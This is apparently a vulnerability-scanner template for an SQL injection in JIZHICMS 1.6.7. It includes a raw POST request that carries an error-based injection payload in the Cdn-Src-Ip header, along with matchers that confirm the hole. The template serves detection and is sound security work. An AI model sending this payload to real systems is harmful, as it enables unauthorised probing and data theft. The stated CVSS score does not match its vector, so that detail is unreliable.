id: jizhicms-cdn-src-ip-sql

info:
  name: JIZHICMS Cdn-Src-Ip SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    JIZHICMS CMS version 1.6.7 is vulnerable to a SQL injection vulnerability in the CDN-SRC-IP parameter of FrPHP\common\Functions.php, allowing attackers to retrieve sensitive information such as passwords.
  reference:
    - https://github.com/Cherry-toto/jizhicms
  classification:
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.5
  tags: sql-injection

http:
  - raw:
      - |
        POST /message/index.html HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cdn-Src-Ip: 2'and extractvalue(1,concat(0x5c,(select md5(332)),0x5c)) and '1'='1

        tid=4&user=1&title=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "c042f4db68f23406c6cecf84a7ebb0f"
      - type: word
        part: body
        words:
          - "XPATH syntax error"
